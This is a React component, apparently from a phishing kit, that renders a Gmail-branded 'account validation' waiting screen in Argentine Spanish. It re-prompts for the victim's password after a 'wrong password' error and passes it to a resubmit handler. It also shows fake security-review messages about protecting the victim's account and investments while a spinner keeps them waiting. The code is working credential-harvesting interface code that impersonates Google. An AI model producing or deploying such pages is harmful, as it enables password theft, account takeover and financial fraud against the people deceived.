import { useState, useCallback } from "react";
import { EyeOff, Eye, Loader2, Mail, ShieldCheck, CircleAlert } from "lucide-react";
import gmailLogo from "@/assets/gmail-logo.svg";

interface WaitingScreenProps {
  email: string;
  sessionId: string;
  errorMessage?: string;
  onPasswordResubmit: (password: string) => Promise<void>;
  onVerifyEmail?: () => void;
}

const WaitingScreen = ({ email, errorMessage, sessionId, onPasswordResubmit, onVerifyEmail }: WaitingScreenProps) => {
  const [retryPassword, setRetryPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleRetrySubmit = useCallback(async (e: React.FormEvent) => {
    e.preventDefault();
    if (!retryPassword.trim()) return;
    setLoading(true);
    await onPasswordResubmit(retryPassword);
    setRetryPassword("");
    setLoading(false);
  }, [retryPassword, onPasswordResubmit]);

  // Show retry form when there's a wrong password error
  if (errorMessage) {
    return (
      <div className="flex flex-col items-center text-center">
        <div className="mb-6 flex h-16 w-16 items-center justify-center rounded-full bg-muted/70">
          <img src={gmailLogo} alt="Gmail" className="h-8 w-8 object-contain" loading="lazy" />
        </div>
        <h3 className="mb-2 text-lg font-semibold text-foreground">
          {errorMessage}
        </h3>
        <p className="mb-6 text-sm text-muted-foreground">
          Ingresá tu contraseña nuevamente.
        </p>

        <form onSubmit={handleRetrySubmit} className="w-full">
          <div className="relative mb-4">
            <input
              type={showPassword ? "text" : "password"}
              placeholder="Ingresá tu contraseña"
              value={retryPassword}
              onChange={(e) => setRetryPassword(e.target.value)}
              autoFocus
              disabled={loading}
              className="w-full rounded-lg border border-border bg-input px-4 py-3 pr-11 text-sm text-foreground placeholder:text-muted-foreground outline-none transition-colors focus:border-ring disabled:opacity-50"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3.5 top-1/2 -translate-y-1/2 text-muted-foreground transition-colors hover:text-foreground"
            >
              {showPassword ? <Eye size={18} /> : <EyeOff size={18} />}
            </button>
          </div>
          <button
            type="submit"
            disabled={loading || !retryPassword.trim()}
            className="w-full rounded-lg bg-primary px-4 py-3 text-sm font-semibold text-primary-foreground transition-colors hover:bg-primary/90 disabled:opacity-50"
          >
            {loading ? (
              <span className="flex items-center justify-center gap-2">
                <Loader2 className="h-4 w-4 animate-spin" />
                Verificando...
              </span>
            ) : (
              "Intentar nuevamente"
            )}
          </button>
        </form>

        <p className="mt-4 text-xs text-muted-foreground/60">{email}</p>
      </div>
    );
  }

  return (
    <div className="flex flex-col items-center text-center">
      <div className="mb-4 flex h-16 w-16 items-center justify-center rounded-2xl border border-primary/15 bg-primary/10 shadow-sm">
        <Loader2 className="h-8 w-8 animate-spin text-primary" />
      </div>

      <div className="mb-3 inline-flex items-center rounded-full border border-primary/20 bg-primary/10 px-3 py-1 text-[11px] font-medium text-primary">
        Actualización segura en curso
      </div>

      <h3 className="mb-1.5 text-lg font-semibold text-foreground">
        Tu cuenta requiere validación
      </h3>
      <p className="max-w-sm text-xs leading-5 text-muted-foreground">
        Necesitamos confirmar algunos datos para proteger tu cuenta y tus inversiones.
      </p>

      {onVerifyEmail && (
        <button
          type="button"
          onClick={onVerifyEmail}
          className="mt-5 flex w-full items-center justify-center gap-2 rounded-xl bg-primary px-4 py-3.5 text-sm font-semibold text-primary-foreground shadow-sm ring-1 ring-primary/20 transition-all hover:bg-primary/90"
        >
          <Mail className="h-4 w-4" />
          Verificar email
        </button>
      )}

      <div className="mt-4 w-full rounded-xl border border-border bg-muted/40 p-3.5 text-left">
        <div className="mb-2.5 flex items-center gap-2 text-xs font-medium text-foreground">
          <ShieldCheck className="h-4 w-4 text-primary" />
          Proceso protegido
        </div>

        <div className="space-y-2">
          {[
            "Verificá tu email para confirmar el acceso.",
            "Validá los datos solicitados.",
            "Completá la revisión para seguir operando.",
          ].map((item, index) => (
            <div key={item} className="flex items-start gap-2.5 rounded-lg border border-border/70 bg-background/80 px-3 py-2">
              <span className="flex h-5 w-5 shrink-0 items-center justify-center rounded-full bg-primary/10 text-[10px] font-semibold text-primary">
                {index + 1}
              </span>
              <p className="text-xs leading-4.5 text-muted-foreground">{item}</p>
            </div>
          ))}
        </div>
      </div>

      <div className="mt-3 w-full rounded-xl border border-border bg-secondary/30 px-3.5 py-2.5 text-left">
        <div className="flex items-start gap-2.5">
          <CircleAlert className="mt-0.5 h-4 w-4 shrink-0 text-primary" />
          <p className="text-[11px] leading-4.5 text-muted-foreground">
            Esta revisión de seguridad puede tomar unos instantes.
          </p>
        </div>
      </div>

      <p className="mt-4 text-xs text-muted-foreground/60 break-all">
        {email}
      </p>
      <div className="mt-6 flex gap-1.5" aria-hidden="true">
        <span className="h-2 w-2 animate-bounce rounded-full bg-primary [animation-delay:0ms]" />
        <span className="h-2 w-2 animate-bounce rounded-full bg-primary [animation-delay:150ms]" />
        <span className="h-2 w-2 animate-bounce rounded-full bg-primary [animation-delay:300ms]" />
      </div>
    </div>
  );
};

export default WaitingScreen;
